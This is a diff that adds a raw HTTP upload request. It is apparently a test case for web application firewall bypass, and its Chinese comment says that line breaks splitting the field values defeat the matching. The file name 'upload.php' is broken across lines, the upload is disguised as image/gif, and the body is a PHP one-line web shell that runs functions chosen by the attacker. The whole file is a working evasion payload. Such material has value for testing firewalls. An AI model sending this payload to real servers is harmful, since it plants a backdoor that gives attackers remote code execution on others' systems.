@@ -1,0 +1,18 @@
+# upload_bypass_畸形表单5
+# 通过在不同位置回车换行截断数据，使得无法匹配完整字段值而造成了绕过
+POST /?bid=hd_tag_m8mv23sz HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23sz
+RM-PRO-Token: e0476e0c680ba88c40cdb723724bb3a8
+RM-PRO-Time: 1742808342916
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=aabbxxyy
+
+--aabbxxyy
+Content-Disposition: form-data; name="file"; file
+name="upload.p
+hp"
+Content-Type: image/gif
+
+<?php $_GET[a]($_GET[b]);?>
+--aabbxxyy--
